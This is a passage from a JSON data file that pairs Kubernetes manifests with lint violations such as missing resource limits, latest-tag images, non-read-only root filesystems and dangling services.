txt-stat\n        hostPath:\n          path: /usr/sbin/txt-stat\n      - name: ta-hostname-path\n        hostPath:\n          path: /etc/hostname\n          type: File\n      - name: ta-hosts-path\n        hostPath:\n          path: /etc/hosts\n          type: File\n      - name: ta-host-os-path\n        hostPath:\n          path: /etc/os-release\n          type: File\n      - name: ta-mem-path\n        hostPath:\n          path: /dev/mem\n      - name: ta-acpi-path\n        hostPath:\n          path: /sys/firmware/acpi/tables/TPM2\n      - name: uefi\n        hostPath:\n          path: /sys/firmware/dmi/tables/DMI\n      - name: wla-config-volume\n        hostPath:\n          path: /etc/workload-agent\n          type: DirectoryOrCreate\n      - name: ta-secrets\n        projected:\n          sources:\n          - secret:\n              name: ta-credentials\n          - secret:\n              name: bearer-token\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"ta-txt\" has memory limit 0"
  },
  {
    "id": "7973",
    "manifest_path": "data/manifests/the_stack_sample/sample_2944.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: cassandra-setup\nspec:\n  containers:\n  - name: cassandra-setup\n    imagePullPolicy: Always\n    image: thingsboard/cassandra-setup:2.1.0\n    env:\n    - name: ADD_DEMO_DATA\n      value: 'true'\n    - name: CASSANDRA_HOST\n      value: cassandra-headless\n    - name: CASSANDRA_PORT\n      value: '9042'\n    - name: DATABASE_ENTITIES_TYPE\n      value: cassandra\n    - name: DATABASE_TS_TYPE\n      value: cassandra\n    - name: CASSANDRA_URL\n      value: cassandra-headless:9042\n    command:\n    - sh\n    - -c\n    - /install.sh\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"cassandra-setup\" does not have a read-only root file system"
  },
  {
    "id": "7974",
    "manifest_path": "data/manifests/the_stack_sample/sample_2944.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: cassandra-setup\nspec:\n  containers:\n  - name: cassandra-setup\n    imagePullPolicy: Always\n    image: thingsboard/cassandra-setup:2.1.0\n    env:\n    - name: ADD_DEMO_DATA\n      value: 'true'\n    - name: CASSANDRA_HOST\n      value: cassandra-headless\n    - name: CASSANDRA_PORT\n      value: '9042'\n    - name: DATABASE_ENTITIES_TYPE\n      value: cassandra\n    - name: DATABASE_TS_TYPE\n      value: cassandra\n    - name: CASSANDRA_URL\n      value: cassandra-headless:9042\n    command:\n    - sh\n    - -c\n    - /install.sh\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"cassandra-setup\" is not set to runAsNonRoot"
  },
  {
    "id": "7975",
    "manifest_path": "data/manifests/the_stack_sample/sample_2944.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: cassandra-setup\nspec:\n  containers:\n  - name: cassandra-setup\n    imagePullPolicy: Always\n    image: thingsboard/cassandra-setup:2.1.0\n    env:\n    - name: ADD_DEMO_DATA\n      value: 'true'\n    - name: CASSANDRA_HOST\n      value: cassandra-headless\n    - name: CASSANDRA_PORT\n      value: '9042'\n    - name: DATABASE_ENTITIES_TYPE\n      value: cassandra\n    - name: DATABASE_TS_TYPE\n      value: cassandra\n    - name: CASSANDRA_URL\n      value: cassandra-headless:9042\n    command:\n    - sh\n    - -c\n    - /install.sh\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"cassandra-setup\" has cpu request 0"
  },
  {
    "id": "7976",
    "manifest_path": "data/manifests/the_stack_sample/sample_2944.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: cassandra-setup\nspec:\n  containers:\n  - name: cassandra-setup\n    imagePullPolicy: Always\n    image: thingsboard/cassandra-setup:2.1.0\n    env:\n    - name: ADD_DEMO_DATA\n      value: 'true'\n    - name: CASSANDRA_HOST\n      value: cassandra-headless\n    - name: CASSANDRA_PORT\n      value: '9042'\n    - name: DATABASE_ENTITIES_TYPE\n      value: cassandra\n    - name: DATABASE_TS_TYPE\n      value: cassandra\n    - name: CASSANDRA_URL\n      value: cassandra-headless:9042\n    command:\n    - sh\n    - -c\n    - /install.sh\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"cassandra-setup\" has memory limit 0"
  },
  {
    "id": "7977",
    "manifest_path": "data/manifests/the_stack_sample/sample_2947.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  labels:\n    app: prometheus\n  name: prometheus\n  namespace: kube-system\nspec:\n  ports:\n  - port: 9090\n  selector:\n    app: prometheus\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[app:prometheus])"
  },
  {
    "id": "7978",
    "manifest_path": "data/manifests/the_stack_sample/sample_2949.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: selinux9\nspec:\n  containers:\n  - image: k8s.gcr.io/pause\n    name: container1\n    securityContext:\n      allowPrivilegeEscalation: false\n      seLinuxOptions: {}\n  initContainers:\n  - image: k8s.gcr.io/pause\n    name: initcontainer1\n    securityContext:\n      allowPrivilegeEscalation: false\n      seLinuxOptions: {}\n  securityContext:\n    runAsNonRoot: true\n    seLinuxOptions:\n      type: container_init_t\n    seccompProfile:\n      type: RuntimeDefault\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"container1\" is using an invalid container image, \"k8s.gcr.io/pause\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "7979",
    "manifest_path": "data/manifests/the_stack_sample/sample_2949.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: selinux9\nspec:\n  containers:\n  - image: k8s.gcr.io/pause\n    name: container1\n    securityContext:\n      allowPrivilegeEscalation: false\n      seLinuxOptions: {}\n  initContainers:\n  - image: k8s.gcr.io/pause\n    name: initcontainer1\n    securityContext:\n      allowPrivilegeEscalation: false\n      seLinuxOptions: {}\n  securityContext:\n    runAsNonRoot: true\n    seLinuxOptions:\n      type: container_init_t\n    seccompProfile:\n      type: RuntimeDefault\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"initcontainer1\" is using an invalid container image, \"k8s.gcr.io/pause\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "7980",
    "manifest_path": "data/manifests/the_stack_sample/sample_2949.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: selinux9\nspec:\n  containers:\n  - image: k8s.gcr.io/pause\n    name: container1\n    securityContext:\n      allowPrivilegeEscalation: false\n      seLinuxOptions: {}\n  initContainers:\n  - image: k8s.gcr.io/pause\n    name: initcontainer1\n    securityContext:\n      allowPrivilegeEscalation: false\n      seLinuxOptions: {}\n  securityContext:\n    runAsNonRoot: true\n    seLinuxOptions:\n      type: container_init_t\n    seccompProfile:\n      type: RuntimeDefault\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"container1\" does not have a read-only root file system"
  },
  {
    "id": "7981",
    "manifest_path": "data/manifests/the_stack_sample/sample_2949.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: selinux9\nspec:\n  containers:\n  - image: k8s.gcr.io/pause\n    name: container1\n    securityContext:\n      allowPrivilegeEscalation: false\n      seLinuxOptions: {}\n  initContainers:\n  - image: k8s.gcr.io/pause\n    name: initcontainer1\n    securityContext:\n      allowPrivilegeEscalation: false\n      seLinuxOptions: {}\n  securityContext:\n    runAsNonRoot: true\n    seLinuxOptions:\n      type: container_init_t\n    seccompProfile:\n      type: RuntimeDefault\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"initcontainer1\" does not have a read-only root file system"
  },
  {
    "id": "7982",
    "manifest_path": "data/manifests/the_stack_sample/sample_2949.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: selinux9\nspec:\n  containers:\n  - image: k8s.gcr.io/pause\n    name: container1\n    securityContext:\n      allowPrivilegeEscalation: false\n      seLinuxOptions: {}\n  initContainers:\n  - image: k8s.gcr.io/pause\n    name: initcontainer1\n    securityContext:\n      allowPrivilegeEscalation: false\n      seLinuxOptions: {}\n  securityContext:\n    runAsNonRoot: true\n    seLinuxOptions:\n      type: container_init_t\n    seccompProfile:\n      type: RuntimeDefault\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"container1\" has cpu request 0"
  },
  {
    "id": "7983",
    "manifest_path": "data/manifests/the_stack_sample/sample_2949.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: selinux9\nspec:\n  containers:\n  - image: k8s.gcr.io/pause\n    name: container1\n    securityContext:\n      allowPrivilegeEscalation: false\n      seLinuxOptions: {}\n  initContainers:\n  - image: k8s.gcr.io/pause\n    name: initcontainer1\n    securityContext:\n      allowPrivilegeEscalation: false\n      seLinuxOptions: {}\n  securityContext:\n    runAsNonRoot: true\n    seLinuxOptions:\n      type: container_init_t\n    seccompProfile:\n      type: RuntimeDefault\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"initcontainer1\" has cpu request 0"
  },
  {
    "id": "7984",
    "manifest_path": "data/manifests/the_stack_sample/sample_2949.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: selinux9\nspec:\n  containers:\n  - image: k8s.gcr.io/pause\n    name: container1\n    securityContext:\n      allowPrivilegeEscalation: false\n      seLinuxOptions: {}\n  initContainers:\n  - image: k8s.gcr.io/pause\n    name: initcontainer1\n    securityContext:\n      allowPrivilegeEscalation: false\n      seLinuxOptions: {}\n  securityContext:\n    runAsNonRoot: true\n    seLinuxOptions:\n      type: container_init_t\n    seccompProfile:\n      type: RuntimeDefault\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"container1\" has memory limit 0"
  },
  {
    "id": "7985",
    "manifest_path": "data/manifests/the_stack_sample/sample_2949.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: selinux9\nspec:\n  containers:\n  - image: k8s.gcr.io/pause\n    name: container1\n    securityContext:\n      allowPrivilegeEscalation: false\n      seLinuxOptions: {}\n  initContainers:\n  - image: k8s.gcr.io/pause\n    name: initcontainer1\n    securityContext:\n      allowPrivilegeEscalation: false\n      seLinuxOptions: {}\n  securityContext:\n    runAsNonRoot: true\n    seLinuxOptions:\n      type: container_init_t\n    seccompProfile:\n      type: RuntimeDefault\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"initcontainer1\" has memory limit 0"
  },
  {
    "id": "7986",
    "manifest_path": "data/manifests/the_stack_sample/sample_2950.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-9037\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"nginx\" is using an invalid container image, \"nginx\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "7987",
    "manifest_path": "data/manifests/the_stack_sample/sample_2950.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-9037\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"nginx\" does not have a read-only root file system"
  },
  {
    "id": "7988",
    "manifest_path": "data/manifests/the_stack_sample/sample_2950.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-9037\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"nginx\" is not set to runAsNonRoot"
  },
  {
    "id": "7989",
    "manifest_path": "data/manifests/the_stack_sample/sample_2950.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-9037\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"nginx\" has cpu request 0"
  },
  {
    "id": "7990",
    "manifest_path": "data/manifests/the_stack_sample/sample_2950.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-9037\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"nginx\" has memory limit 0"
  },
  {
    "id": "7991",
    "manifest_path": "data/manifests/the_stack_sample/sample_2951.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  name: notebook-service\nspec:\n  ports:\n  - port: 8888\n    targetPort: 8888\n  selector:\n    component: notebook\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[component:notebook])"
  },
  {
    "id": "7992",
    "manifest_path": "data/manifests/the_stack_sample/sample_2952.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  name: jaxrs-postgres-quarkus\nspec:\n  type: ClusterIP\n  selector:\n    app: jaxrs-postgres-quarkus\n  ports:\n  - protocol: TCP\n    port: 8080\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[app:jaxrs-postgres-quarkus])"
  },
  {
    "id": "7993",
    "manifest_path": "data/manifests/the_stack_sample/sample_2956.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: azure-2\nspec:\n  containers:\n  - image: kubernetes/pause\n    name: azure-2\n    volumeMounts:\n    - name: azure\n      mountPath: /mnt/azure\n  volumes:\n  - name: azure\n    persistentVolumeClaim:\n      claimName: sample-storage-claim\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"azure-2\" is using an invalid container image, \"kubernetes/pause\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "7994",
    "manifest_path": "data/manifests/the_stack_sample/sample_2956.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: azure-2\nspec:\n  containers:\n  - image: kubernetes/pause\n    name: azure-2\n    volumeMounts:\n    - name: azure\n      mountPath: /mnt/azure\n  volumes:\n  - name: azure\n    persistentVolumeClaim:\n      claimName: sample-storage-claim\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"azure-2\" does not have a read-only root file system"
  },
  {
    "id": "7995",
    "manifest_path": "data/manifests/the_stack_sample/sample_2956.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: azure-2\nspec:\n  containers:\n  - image: kubernetes/pause\n    name: azure-2\n    volumeMounts:\n    - name: azure\n      mountPath: /mnt/azure\n  volumes:\n  - name: azure\n    persistentVolumeClaim:\n      claimName: sample-storage-claim\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"azure-2\" is not set to runAsNonRoot"
  },
  {
    "id": "7996",
    "manifest_path": "data/manifests/the_stack_sample/sample_2956.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: azure-2\nspec:\n  containers:\n  - image: kubernetes/pause\n    name: azure-2\n    volumeMounts:\n    - name: azure\n      mountPath: /mnt/azure\n  volumes:\n  - name: azure\n    persistentVolumeClaim:\n      claimName: sample-storage-claim\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"azure-2\" has cpu request 0"
  },
  {
    "id": "7997",
    "manifest_path": "data/manifests/the_stack_sample/sample_2956.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: azure-2\nspec:\n  containers:\n  - image: kubernetes/pause\n    name: azure-2\n    volumeMounts:\n    - name: azure\n      mountPath: /mnt/azure\n  volumes:\n  - name: azure\n    persistentVolumeClaim:\n      claimName: sample-storage-claim\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"azure-2\" has memory limit 0"
  },
  {
    "id": "7998",
    "manifest_path": "data/manifests/the_stack_sample/sample_2957.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  name: iter8-app-candidate\n  labels:\n    app: iter8-app-candidate\n    service: iter8-app-candidate\nspec:\n  ports:\n  - port: 8000\n    name: http\n  selector:\n    app: iter8-app-candidate\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[app:iter8-app-candidate])"
  },
  {
    "id": "7999",
    "manifest_path": "data/manifests/the_stack_sample/sample_2958.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-4169\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"nginx\" is using an invalid container image, \"nginx\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "8000",
    "manifest_path": "data/manifests/the_stack_sample/sample_2958.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-4169\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"nginx\" does not have a read-only root file system"
  },
  {
    "id": "8001",
    "manifest_path": "data/manifests/the_stack_sample/sample_2958.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-4169\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"nginx\" is not set to runAsNonRoot"
  },
  {
    "id": "8002",
    "manifest_path": "data/manifests/the_stack_sample/sample_2958.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-4169\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"nginx\" has cpu request 0"
  },
  {
    "id": "8003",
    "manifest_path": "data/manifests/the_stack_sample/sample_2958.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-4169\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"nginx\" has memory limit 0"
  },
  {
    "id": "8004",
    "manifest_path": "data/manifests/the_stack_sample/sample_2959.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  name: mi41564-service\n  labels:\n    name: mi41564\nspec:\n  ports:\n  - protocol: TCP\n    port: 8080\n    targetPort: 3002\n  selector:\n    name: mi41564\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[name:mi41564])"
  },
  {
    "id": "8005",
    "manifest_path": "data/manifests/the_stack_sample/sample_2961.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  name: grayisgreatpipelinesjavascriptdocker\nspec:\n  type: LoadBalancer\n  ports:\n  - port: 8080\n  selector:\n    app: grayisgreatpipelinesjavascriptdocker\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[app:grayisgreatpipelinesjavascriptdocker])"
  },
  {
    "id": "8006",
    "manifest_path": "data/manifests/the_stack_sample/sample_2965.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app: kyverno\n    app.kubernetes.io/name: kyverno\n  name: kyverno\nspec:\n  selector:\n    matchLabels:\n      app: kyverno\n      app.kubernetes.io/name: kyverno\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        app: kyverno\n        app.kubernetes.io/name: kyverno\n    spec:\n      volumes:\n      - name: sigstore\n        emptyDir: {}\n      affinity:\n        podAntiAffinity:\n          preferredDuringSchedulingIgnoredDuringExecution:\n          - weight: 1\n            podAffinityTerm:\n              labelSelector:\n                matchExpressions:\n                - key: app.kubernetes.io/name\n                  operator: In\n                  values:\n                  - kyverno\n              topologyKey: kubernetes.io/hostname\n      serviceAccountName: kyverno-service-account\n      securityContext:\n        runAsNonRoot: true\n      initContainers:\n      - name: kyverno-pre\n        image: ghcr.io/kyverno/kyvernopre:latest\n        imagePullPolicy: IfNotPresent\n        resources:\n          limits:\n            cpu: 100m\n            memory: 256Mi\n          requests:\n            cpu: 10m\n            memory: 64Mi\n        securityContext:\n          runAsNonRoot: true\n          privileged: false\n          allowPrivilegeEscalation: false\n          readOnlyRootFilesystem: true\n          capabilities:\n            drop:\n            - ALL\n        env:\n        - name: METRICS_CONFIG\n          value: kyverno-metrics\n        - name: KYVERNO_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n      containers:\n      - name: kyverno\n        image: ghcr.io/kyverno/kyverno:latest\n        imagePullPolicy: IfNotPresent\n        args:\n        - --filterK8sResources=[Event,*,*][*,kube-system,*][*,kube-public,*][*,kube-node-lease,*][Node,*,*][APIService,*,*][TokenReview,*,*][SubjectAccessReview,*,*][*,kyverno,kyverno*][Binding,*,*][ReplicaSet,*,*][ReportChangeRequest,*,*][ClusterReportChangeRequest,*,*][PolicyReport,*,*][ClusterPolicyReport,*,*]\n        - -v=2\n        - --autogenInternals=false\n        ports:\n        - containerPort: 9443\n          name: https\n          protocol: TCP\n        - containerPort: 8000\n          name: metrics-port\n          protocol: TCP\n        env:\n        - name: INIT_CONFIG\n          value: kyverno\n        - name: METRICS_CONFIG\n          value: kyverno-metrics\n        - name: KYVERNO_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: KYVERNO_SVC\n          value: kyverno-svc\n        - name: TUF_ROOT\n          value: /.sigstore\n        securityContext:\n          runAsNonRoot: true\n          privileged: false\n          allowPrivilegeEscalation: false\n          readOnlyRootFilesystem: true\n          capabilities:\n            drop:\n            - ALL\n        resources:\n          requests:\n            memory: 128Mi\n            cpu: 100m\n          limits:\n            memory: 384Mi\n        livenessProbe:\n          httpGet:\n            path: /health/liveness\n            port: 9443\n            scheme: HTTPS\n          initialDelaySeconds: 15\n          periodSeconds: 30\n          timeoutSeconds: 5\n          failureThreshold: 2\n          successThreshold: 1\n        readinessProbe:\n          httpGet:\n            path: /health/readiness\n            port: 9443\n            scheme: HTTPS\n          initialDelaySeconds: 5\n          periodSeconds: 10\n          timeoutSeconds: 5\n          failureThreshold: 4\n          successThreshold: 1\n        volumeMounts:\n        - mountPath: /.sigstore\n          name: sigstore\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"kyverno\" is using an invalid container image, \"ghcr.io/kyverno/kyverno:latest\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "8007",
    "manifest_path": "data/manifests/the_stack_sample/sample_2965.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app: kyverno\n    app.kubernetes.io/name: kyverno\n  name: kyverno\nspec:\n  selector:\n    matchLabels:\n      app: kyverno\n      app.kubernetes.io/name: kyverno\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        app: kyverno\n        app.kubernetes.io/name: kyverno\n    spec:\n      volumes:\n      - name: sigstore\n        emptyDir: {}\n      affinity:\n        podAntiAffinity:\n          preferredDuringSchedulingIgnoredDuringExecution:\n          - weight: 1\n            podAffinityTerm:\n              labelSelector:\n                matchExpressions:\n                - key: app.kubernetes.io/name\n                  operator: In\n                  values:\n                  - kyverno\n              topologyKey: kubernetes.io/hostname\n      serviceAccountName: kyverno-service-account\n      securityContext:\n        runAsNonRoot: true\n      initContainers:\n      - name: kyverno-pre\n        image: ghcr.io/kyverno/kyvernopre:latest\n        imagePullPolicy: IfNotPresent\n        resources:\n          limits:\n            cpu: 100m\n            memory: 256Mi\n          requests:\n            cpu: 10m\n            memory: 64Mi\n        securityContext:\n          runAsNonRoot: true\n          privileged: false\n          allowPrivilegeEscalation: false\n          readOnlyRootFilesystem: true\n          capabilities:\n            drop:\n            - ALL\n        env:\n        - name: METRICS_CONFIG\n          value: kyverno-metrics\n        - name: KYVERNO_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n      containers:\n      - name: kyverno\n        image: ghcr.io/kyverno/kyverno:latest\n        imagePullPolicy: IfNotPresent\n        args:\n        - --filterK8sResources=[Event,*,*][*,kube-system,*][*,kube-public,*][*,kube-node-lease,*][Node,*,*][APIService,*,*][TokenReview,*,*][SubjectAccessReview,*,*][*,kyverno,kyverno*][Binding,*,*][ReplicaSet,*,*][ReportChangeRequest,*,*][ClusterReportChangeRequest,*,*][PolicyReport,*,*][ClusterPolicyReport,*,*]\n        - -v=2\n        - --autogenInternals=false\n        ports:\n        - containerPort: 9443\n          name: https\n          protocol: TCP\n        - containerPort: 8000\n          name: metrics-port\n          protocol: TCP\n        env:\n        - name: INIT_CONFIG\n          value: kyverno\n        - name: METRICS_CONFIG\n          value: kyverno-metrics\n        - name: KYVERNO_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: KYVERNO_SVC\n          value: kyverno-svc\n        - name: TUF_ROOT\n          value: /.sigstore\n        securityContext:\n          runAsNonRoot: true\n          privileged: false\n          allowPrivilegeEscalation: false\n          readOnlyRootFilesystem: true\n          capabilities:\n            drop:\n            - ALL\n        resources:\n          requests:\n            memory: 128Mi\n            cpu: 100m\n          limits:\n            memory: 384Mi\n        livenessProbe:\n          httpGet:\n            path: /health/liveness\n            port: 9443\n            scheme: HTTPS\n          initialDelaySeconds: 15\n          periodSeconds: 30\n          timeoutSeconds: 5\n          failureThreshold: 2\n          successThreshold: 1\n        readinessProbe:\n          httpGet:\n            path: /health/readiness\n            port: 9443\n            scheme: HTTPS\n          initialDelaySeconds: 5\n          periodSeconds: 10\n          timeoutSeconds: 5\n          failureThreshold: 4\n          successThreshold: 1\n        volumeMounts:\n        - mountPath: /.sigstore\n          name: sigstore\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"kyverno-pre\" is using an invalid container image, \"ghcr.io/kyverno/kyvernopre:latest\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "8008",
    "manifest_path": "data/manifests/the_stack_sample/sample_2965.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app: kyverno\n    app.kubernetes.io/name: kyverno\n  name: kyverno\nspec:\n  selector:\n    matchLabels:\n      app: kyverno\n      app.kubernetes.io/name: kyverno\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        app: kyverno\n        app.kubernetes.io/name: kyverno\n    spec:\n      volumes:\n      - name: sigstore\n        emptyDir: {}\n      affinity:\n        podAntiAffinity:\n          preferredDuringSchedulingIgnoredDuringExecution:\n          - weight: 1\n            podAffinityTerm:\n              labelSelector:\n                matchExpressions:\n                - key: app.kubernetes.io/name\n                  operator: In\n                  values:\n                  - kyverno\n              topologyKey: kubernetes.io/hostname\n      serviceAccountName: kyverno-service-account\n      securityContext:\n        runAsNonRoot: true\n      initContainers:\n      - name: kyverno-pre\n        image: ghcr.io/kyverno/kyvernopre:latest\n        imagePullPolicy: IfNotPresent\n        resources:\n          limits:\n            cpu: 100m\n            memory: 256Mi\n          requests:\n            cpu: 10m\n            memory: 64Mi\n        securityContext:\n          runAsNonRoot: true\n          privileged: false\n          allowPrivilegeEscalation: false\n          readOnlyRootFilesystem: true\n          capabilities:\n            drop:\n            - ALL\n        env:\n        - name: METRICS_CONFIG\n          value: kyverno-metrics\n        - name: KYVERNO_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n      containers:\n      - name: kyverno\n        image: ghcr.io/kyverno/kyverno:latest\n        imagePullPolicy: IfNotPresent\n        args:\n        - --filterK8sResources=[Event,*,*][*,kube-system,*][*,kube-public,*][*,kube-node-lease,*][Node,*,*][APIService,*,*][TokenReview,*,*][SubjectAccessReview,*,*][*,kyverno,kyverno*][Binding,*,*][ReplicaSet,*,*][ReportChangeRequest,*,*][ClusterReportChangeRequest,*,*][PolicyReport,*,*][ClusterPolicyReport,*,*]\n        - -v=2\n        - --autogenInternals=false\n        ports:\n        - containerPort: 9443\n          name: https\n          protocol: TCP\n        - containerPort: 8000\n          name: metrics-port\n          protocol: TCP\n        env:\n        - name: INIT_CONFIG\n          value: kyverno\n        - name: METRICS_CONFIG\n          value: kyverno-metrics\n        - name: KYVERNO_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: KYVERNO_SVC\n          value: kyverno-svc\n        - name: TUF_ROOT\n          value: /.sigstore\n        securityContext:\n          runAsNonRoot: true\n          privileged: false\n          allowPrivilegeEscalation: false\n          readOnlyRootFilesystem: true\n          capabilities:\n            drop:\n            - ALL\n        resources:\n          requests:\n            memory: 128Mi\n            cpu: 100m\n          limits:\n            memory: 384Mi\n        livenessProbe:\n          httpGet:\n            path: /health/liveness\n            port: 9443\n            scheme: HTTPS\n          initialDelaySeconds: 15\n          periodSeconds: 30\n          timeoutSeconds: 5\n          failureThreshold: 2\n          successThreshold: 1\n        readinessProbe:\n          httpGet:\n            path: /health/readiness\n            port: 9443\n            scheme: HTTPS\n          initialDelaySeconds: 5\n          periodSeconds: 10\n          timeoutSeconds: 5\n          failureThreshold: 4\n          successThreshold: 1\n        volumeMounts:\n        - mountPath: /.sigstore\n          name: sigstore\n",
    "policy_id": "non-existent-service-account",
    "violation_text": "serviceAccount \"kyverno-service-account\" not found"
  },
  {
    "id": "8009",
    "manifest_path": "data/manifests/the_stack_sample/sample_2966.yaml",
